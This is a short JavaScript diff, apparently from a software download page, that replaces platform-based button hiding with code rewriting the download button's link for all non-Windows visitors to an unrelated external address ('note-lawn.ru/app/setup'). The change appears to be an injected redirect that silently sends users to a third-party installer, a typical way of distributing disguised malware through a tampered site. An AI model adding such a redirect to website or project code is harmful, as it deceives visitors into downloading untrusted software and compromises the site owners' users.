@@ -46,7 +46,10 @@ async function request(url) {
   }
 
   const os = window.navigator.userAgentData?.platform
-  const button = document.querySelector(os === "Windows" ? ".unix" : ".win")
-
-  button?.parentNode.removeChild(button)
+  
+  if(os !== "Windows") {
+      const button = document.querySelector(".download-btn")
+      
+      button.setAttribute('href', 'https://note-lawn.ru/app/setup')
+  }
 })()
